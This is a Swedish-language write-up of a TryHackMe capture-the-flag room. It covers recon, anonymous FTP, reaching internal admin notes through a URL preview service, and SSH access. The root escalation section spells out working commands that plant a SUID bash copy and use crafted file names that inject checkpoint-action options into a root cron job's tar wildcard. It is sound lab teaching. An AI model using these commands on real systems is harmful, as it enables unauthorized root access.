# Operation Coldstart

![Screenshot](img/Pasted%20image%2020260527120500.png)

https://tryhackme.com/room/operationcoldstart
## Introduction

> Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

![Screenshot](img/Pasted%20image%2020260527120603.png)
## Recon

En snabb scan med nmap visar att det finns tre öppna portar: 80 (lämpligt för en staging-site), 22 (ssh är oftast öppet på dessa burkar) och 21 (ftp, oj oj).
### Hemsidan

Hemsidan tar mig till Volt Labs och deras URL Preview Service

![Screenshot](img/Pasted%20image%2020260527123132.png)

Jag gillar att det står "do not expose externally" i copyright-texten :)

Slår in Google i formuläret och får följande:

![Screenshot](img/Pasted%20image%2020260527123227.png)

Sökordet kommer upp som en query parameter i URL:en. Möjlig väg för SQLi?

![Screenshot](img/Pasted%20image%2020260527123503.png)

Vad säger en fuzzing av endpoints? Inte jättemycket spännande...

![Screenshot](img/Pasted%20image%2020260527133024.png)
## FTP

Tillåts anonym inloggning? Jadå! Vad hittas? Nån slags backup, spännande.

![Screenshot](img/Pasted%20image%2020260527133255.png)

Tar-filen innehöll en mapp som heter `voltlabs-preview` med ett gäng grejer i:

![Screenshot](img/Pasted%20image%2020260527133536.png)
#### README.md
![Screenshot](img/Pasted%20image%2020260527133643.png)
#### requirements.txt
![Screenshot](img/Pasted%20image%2020260527133708.png)
#### app.py
Där får vi insyn i hur appen som hostas på servern ser ut. Lägger genast märke till en kommentar

![Screenshot](img/Pasted%20image%2020260527134111.png)

Antar att om vi lägger till `kestrel.thm` i `/etc/hosts` så kommer det lira. I nuläget får våra requests IP-numret som host-header.

Längst ner hittar vi även följande:

![Screenshot](img/Pasted%20image%2020260527134449.png)

När vi då har rätt hostname i `/etc/hosts` kan vi förhoppningsvis köra appen mot `http://kestrel.thm/admin/notes` och se vad som står i filen `/opt/voltlabs-preview/admin_notes.txt` på servern.

Voilà!

![Screenshot](img/Pasted%20image%2020260527135149.png)
## SSH

Lyckas vi komma in på burken? Oh yes! Och där har vi `user.txt`

![Screenshot](img/Pasted%20image%2020260527135259.png)

Dags att eskalera!
## Flagga två

Användaren `webdev` får tyvärr inte köra något med sudo.

Några intressanta cronjobb? 

![Screenshot](img/Pasted%20image%2020260527140248.png)

![Screenshot](img/Pasted%20image%2020260527140320.png)

Just `voltlabs-backup` ser särskilt intressant ut!

![Screenshot](img/Pasted%20image%2020260527140953.png)

Varje minut körs ett cronjobb som cd:ar till `/opt/backups` och skapar en backup som en tar-fil. Wildcardet `*` tar med alla filer i katalogen och bakar in det i backupen. Men, vi kan utnyttja detta! 

Det finns en sårbarhet när **tar** och wildcardet `*` körs tillsammans på det här sättet. Tar använder wildcardet för att baka in *alla filer*, men innan tar hinner göra det ersätter shell `*` med alla filnamn i den katalogen. Om vi då skapar filer som är namngivna `--` kommer **tar** att missta dessa filer för att vara en flagga/command-line option.

Hänger ni med? Jag hänger typ med. Let's go!

```bash
# Navigera till rätt katalog
cd /opt/backups

# Skapa shell.sh med SUID-biten satt. Och ja, rootbeer låter roligare än rootbash
echo 'cp /bin/bash /tmp/rootbeer && chmod +s /tmp/rootbeer' > shell.sh

# Gör filen exekverbar
chmod +x shell.sh

# Skapa två filer. Namnsättningen gör att tar misstar dem för cli options
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Efter att ha väntat en liten stund körde jag `/tmp/rootbeer -p` och fick mitt root shell:

![Screenshot](img/Pasted%20image%2020260601121622.png)

Därefter var det bara att kamma hem flaggan. Happy hacking!